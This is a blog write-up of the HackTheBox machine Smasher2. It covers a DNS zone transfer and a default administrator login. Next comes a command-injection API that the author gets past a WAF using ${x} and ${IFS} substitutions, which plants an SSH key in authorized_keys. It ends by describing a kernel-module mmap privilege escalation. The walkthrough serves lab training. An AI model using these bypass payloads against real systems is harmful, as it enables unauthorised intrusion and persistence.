---
categories:
- CTF
layout: post
media_subpath: /assets/posts/2019-06-10-smasher-2-hackthebox
title: Smasher 2 @ HackTheBox
---

Smasher2 is a difficult 50 points machine on hackthebox, involving some guessing to get the user flag (because the author left in an unintended solution), and a custom kernel exploit to get root.

## User Flag

The initial scan shows the following ports:

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 23:a3:55:a8:c6:cc:74:cc:4d:c7:2c:f8:fc:20:4e:5a (RSA)
|   256 16:21:ba:ce:8c:85:62:04:2e:8c:79:fa:0e:ea:9d:33 (ECDSA)
|_  256 00:97:93:b8:59:b5:0f:79:52:e1:8a:f1:4f:ba:ac:b4 (ED25519)
53/tcp open  domain  ISC BIND 9.11.3-1ubuntu1.3 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.11.3-1ubuntu1.3-Ubuntu
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Tcp port 53 is open – this is unusual and often an indicator that a zone transfer is needed in CTFs. We do the transfer and get the following results:

```
dig axfr @10.10.10.135 smasher2.htb

; <<>> DiG 9.11.5-P4-5.1-Debian <<>> axfr @10.10.10.135 smasher2.htb
; (1 server found)
;; global options: +cmd
smasher2.htb.        604800  IN  SOA smasher2.htb. root.smasher2.htb. 41 604800 86400 2419200 604800
smasher2.htb.        604800  IN  NS  smasher2.htb.
smasher2.htb.        604800  IN  A   127.0.0.1
smasher2.htb.        604800  IN  AAAA    ::1
smasher2.htb.        604800  IN  PTR wonderfulsessionmanager.smasher2.htb.
smasher2.htb.        604800  IN  SOA smasher2.htb. root.smasher2.htb. 41 604800 86400 2419200 604800
;; Query time: 37 msec
;; SERVER: 10.10.10.135#53(10.10.10.135)
;; WHEN: Sat Jun 29 16:48:25 CEST 2019
;; XFR size: 6 records (messages 1, bytes 242)
```

We found a vhost "wonderfulsessionmanager.smasher2.htb" and use it in firefox to have a look at the webpage. There is a login field where we try some credentials, eventually succeeding with ‘Administrator:Administrator’. This is the unintended part, as the password was supposed to be something more difficult and the only way in through exploitation of the web application.

![](htb_smasher2_login_success.png)

We can now send a POST-Request to "http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job" to interact with the API. We don’t really know which parameters it takes though. When sending something we fortunately get an error which reveals the needed parameter:

```
POST /api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job HTTP/1.1
Host: wonderfulsessionmanager.smasher2.htb
Content-type: application/json
Cookie: session=eyJpZCI6eyIgYiI6Ill6UTBNRGc0WVRZNU56UmhPVFkxTXpCak4yWmtZamhrTTJFM01UQTNNbVV6WW1ZNE56VmhNQT09In19.XReHPg.2KfK-afS4nWhnGwN-CFcsod_k5U
Content-Length: 17

{"cmd": "i${x}d"}

HTTP/1.1 200 OK
Date: Sat, 29 Jun 2019 15:44:56 GMT
Server: Werkzeug/0.14.1 Python/2.7.15rc1
Content-Type: application/json
Content-Length: 57
Vary: Cookie
{"result":"Missing schedule parameter.","success":false}
```

Note that we can not just write "id" because the WAF will catch it – when using "i${x}d" we insert a substitution that will be replaced with an empty string, bypassing the WAF. When using the schedule parameter we add our public key to authorized keys, resulting in a ssh connection:

```
{"schedule":"echo${IFS}<key in b64>${IFS}>t"}

{"schedule":"m${x}kd${x}ir$IFS.$x.$x/.${x}s${x}s${x}h"}

{"schedule":"base64$IFS-${x}d<t>.$x.$x/.${x}s${x}s${x}h/authorized_keys"}

ssh -i xct.key dzonerzy@smasher2.htb
```

## Root Flag

We notice that the user is in the group "adm":

```
dzonerzy@smasher2:~$ id
uid=1000(dzonerzy) gid=1000(dzonerzy) groups=1000(dzonerzy),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
```

This is often a hint to look for log files as members of the adm can usually read them. In "auth.log" we find the following:

```
May  9 11:19:53 smasher2 sudo:     root : TTY=unknown ; PWD=/ ; USER=dzonerzy ; COMMAND=/bin/bash -c cd /home/dzonerzy/smanager && ./runner.py 2>&1 > /dev/null &
May  9 11:19:53 smasher2 sudo:     root : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/sbin/insmod /lib/modules/4.15.0-45-generic/kernel/drivers/hid/dhid.ko
```

Root inserted a kernel module which is suspicious. Running strings on the LKM shows the following:

```
This is the right way, please exploit this shit!
```

We copy over the binary with scp to our box and start to analyze it with ghidra.The LKM implements a character device, which we can open, read, close and use mmap on. We create a Ubuntu VM, insert the module and play around a bit. After a while we notice that the mmap implementation is broken, which leads to arbitrary mapping of memory as root. To exploit the issue we use a common exploit method, searching for the credential structure of our process and overwriting the ids with zeros to elevate the process. The complete exploit can be found [here](https://gist.github.com/xct/89a4b37c2a0bd4bd2425c9f6749f170f).